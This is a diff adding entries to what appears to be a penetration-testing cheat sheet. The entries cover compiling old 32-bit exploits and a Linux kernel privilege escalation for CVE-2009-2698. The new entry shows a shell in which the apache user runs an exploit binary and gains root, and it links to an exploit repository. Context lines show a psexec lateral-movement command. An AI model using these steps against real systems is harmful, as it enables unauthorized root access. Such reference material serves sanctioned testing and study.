@@ -677,10 +677,27 @@ proxychains psexec.py victim:password@<victim $IP> cmd.exe
 ### Old exploits .c
 ````
 sudo apt-get install gcc-multilib
+sudo apt-get install libx11-dev:i386 libx11-dev
 gcc 624.c -m32 -o exploit
 ````
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
 ### Kernel Expoits
+#### CVE-2009-2698
+````
+uname -a
+Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux
+bash-3.00$ id 
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-3.00$ ./exp
+./exp
+sh-3.00# id
+id
+uid=0(root) gid=0(root) groups=48(apache)
+````
+````
+https://github.com/MrG3tty/Linux-2.6.9-Kernel-Exploit
+````
 #### CVE-2021-4034
 ````
 uname -a
